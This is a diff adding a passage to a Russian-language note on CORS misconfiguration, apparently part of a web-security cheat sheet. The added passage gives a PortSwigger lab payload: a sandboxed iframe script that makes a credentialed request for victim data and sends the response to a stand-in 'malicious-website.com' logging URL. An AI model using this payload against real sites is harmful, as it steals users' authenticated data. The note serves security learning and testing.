@@ -44,6 +44,22 @@ Access-Control-Allow-Credentials: true
 </html>
 ```
 
+Иногда допускает `Origin: null`. Как добиться такого origin (из [portswigger](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)):
+
+```markup
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='malicious-website.com/log?key='+this.responseText;
+};
+</script>"></iframe>
+```
+
 ### Замечание
 
 Если указан Access-Control-Allow-Credentials: true, то в CORS wildcard (\*) не будут работать
